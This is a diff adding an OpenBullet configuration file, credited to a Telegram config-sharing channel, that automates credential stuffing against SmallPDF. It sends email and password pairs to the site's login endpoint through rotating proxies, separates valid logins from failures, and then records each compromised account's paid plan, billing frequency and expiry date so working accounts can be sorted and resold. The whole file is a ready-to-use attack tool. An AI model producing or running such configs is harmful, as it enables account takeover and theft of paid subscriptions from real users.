@@ -1,0 +1,106 @@
+[SETTINGS]
+{
+  "Name": "SmallPDF",
+  "SuggestedBots": 130,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-29T15:26:18.3594122-06:00",
+  "AdditionalInfo": "",
+  "Author": "@OpenbulletConfigsOfficial  telegram",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://pro.smallpdf.com/pro/authenticate" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: pro.smallpdf.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://smallpdf.com/" 
+  HEADER "Content-Type: text/plain;charset=UTF-8" 
+  HEADER "Origin: https://smallpdf.com" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "error\":\"unauthorized" 
+    KEY "error\":\"invalid_json" 
+    KEY "<RESPONSECODE>" EqualTo "401" 
+  KEYCHAIN Success OR 
+    KEY "{\"success\":true" 
+
+REQUEST GET "https://pro.smallpdf.com/pro/next-payment" 
+  
+  COOKIE "cookie: <COOKIES(_s.at)>" 
+  HEADER "Host: pro.smallpdf.com" 
+  HEADER "Origin: https://smallpdf.com" 
+  HEADER "Referer: https://smallpdf.com/" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" 
+
+PARSE "<SOURCE>" JSON "plan_id" -> VAR "Plan" 
+
+FUNCTION Translate 
+  KEY "desktop-yearly-usd" VALUE "Pro Yearly" 
+  KEY "desktop-monthly-usd" VALUE "Pro Monthly" 
+  "<Plan>" -> CAP "Plan Name" 
+
+PARSE "<SOURCE>" JSON "billing_frequency" CreateEmpty=FALSE -> CAP "Billing Frequency" "Every " " Month" 
+
+PARSE "<SOURCE>" JSON "paid_through_date" CreateEmpty=FALSE -> CAP "Expiry Date" 
+
+FUNCTION DateToUnixTime "yyyy-MM-dd" "<Expiry Date>" -> VAR "ex" 
+
+FUNCTION CurrentUnixTime -> VAR "curr" 
+
+FUNCTION Constant "Telegram - t.me/OpenbulletConfigsOfficial   ( backup - t.me/TeamOpenbullet )" -> CAP "Config By" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "error\":\"unsubscribed\"" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<ex>" LessThan "<curr>" 
+
